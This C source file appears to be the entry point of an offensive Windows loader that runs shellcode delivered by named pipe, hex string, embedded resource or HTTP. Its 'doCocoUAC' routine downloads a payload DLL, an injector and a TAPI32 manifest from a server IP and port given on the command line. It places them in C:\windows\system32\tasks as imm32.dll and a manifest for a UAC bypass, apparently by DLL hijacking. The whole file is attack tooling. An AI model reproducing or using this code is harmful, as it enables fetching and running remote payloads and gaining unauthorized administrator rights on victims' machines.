#include "core.h"
#include "api_helper.h"
#include "parser.h"


const char* path_manifest = "C:\\windows\\system32\\tasks\\TAPI32.Manifest";
const char* path_dll = "C:\\windows\\system32\\tasks\\imm32.dll";
void doCocoUAC(const char* ip, int port,
    const char* path_manifest,
    const char* path_dll,
    const char* payload,
    const char* tapi32_manifest,
    const char* injector
    );

void helper_0(int argc, char* argv[]) {

    if (argc == 1) {
        rcPayload();
        return;
    }

    // Parse command-line arguments
    arg_parser(argc, argv);

    // Execute based on selected method
    switch (selected_method) {
    case METHOD_NAMEDPIPE:
        printf("[+] Using NamedPipe method\n");
        if (elevate) {
            if (!server_ip || !server_port || !tapi32_manifest || !injector_dll || !payload_dll || reuse_http) {
                printf("[-] Elevate requires  --server-ip, --server-port, --tapi32-manifest, --injector, and --payload to be specified with namedpip method  & --reuse is not allowed\n");
                return;
            }
            printf("[+] Attempting UAC bypass...\n");
            doCocoUAC(
                server_ip,
                server_port,
                path_manifest,
                path_dll,
                payload_dll,
                tapi32_manifest,
                injector_dll
            );
            PipeReader();
            runPayload();
            return;
        }
        PipeReader();
        runPayload();
        break;

    case METHOD_HEXSHELLCODE:
        printf("[+] Using HexShellcode method\n");
        _init_api();
        runPayload();
        break;

    case METHOD_RESSOURCE:
        printf("[+] Using Resource method\n");
        if (elevate) {
            if (!server_ip || !server_port||!tapi32_manifest || !injector_dll || !payload_dll || reuse_http) {
                printf("[-] Elevate requires  --server-ip, --server-port, --tapi32-manifest, --injector, and --payload to be specified with ressource method  & --reuse is not allowed\n");
                return;
			}
            printf("[+] Attempting UAC bypass...\n");
            doCocoUAC(
                server_ip,
                server_port,
                path_manifest,
                path_dll,
                payload_dll,
                tapi32_manifest,
                injector_dll
			);
            printf("[*] Executing UAC bypass routine...\n");
            RCuacBypass();
            return;
        }
        rcPayload();
        break;

    case METHOD_HTTP:
        printf("[+] Using HTTP method\n");
        if (size > 0) {
            printf("[+] Payload retrieved via HTTP successfully!\n");
            printf("[+] Size: %zu bytes\n", size);

            // Handle UAC elevation if requested
            if (elevate) {
                printf("[+] Attempting UAC bypass...\n");
                // If --reuse used, server_ip/port already set from HTTP
                if (!server_ip) server_ip = "127.0.0.1"; // fallback default
                if (!server_port) server_port = 80;
				printf("[*] Using server %s:%d for UAC DLLs\n", server_ip, server_port);

                doCocoUAC(
                    server_ip,
                    server_port,
                    path_manifest,
                    path_dll,
                    payload_dll,
                    tapi32_manifest,
                    injector_dll
                );
                _init_api();
                runPayload();
				return;

            }
            // Execute the payload
            _init_api();
            runPayload();

        }
        else {
            printf("[-] Failed to retrieve HTTP payload\n");
        }
        break;

    default:
        printf("[-] Unknown method selected\n");
        break;
    }
}

// UAC helper
void doCocoUAC(const char* ip, int port,
    const char* path_manifest,
    const char* path_dll,
    const char* payload,
    const char* tapi32_manifest,
    const char* injector
    )
{
    printf("[*] Downloading required files for UAC bypass from %s:%d\n", ip, port);
    http_download_file(ip, port, payload, path_dll);
    http_download_file(ip, port, injector, injector);
    http_download_file(ip, port, tapi32_manifest, path_manifest);
}



int main(int argc, char* argv[]) {
    // Default initialization
    _dll_i(0);
	helper_0(argc, argv);

    return 0;
}
